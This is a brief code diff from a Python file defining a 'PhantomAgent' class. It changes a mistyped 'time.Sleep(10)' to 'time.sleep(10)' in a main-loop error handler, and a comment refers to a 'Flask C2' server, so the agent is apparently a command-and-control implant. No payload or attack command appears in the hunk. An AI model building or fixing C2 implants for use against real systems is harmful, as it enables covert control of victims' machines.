@@ -235,7 +235,7 @@ class PhantomAgent:
                 break
             except Exception as e:
                 print(f"[-] Main loop error: {e}")
-                time.Sleep(10)
+                time.sleep(10)
 
 def main():
     # Use local server (your current Flask C2)
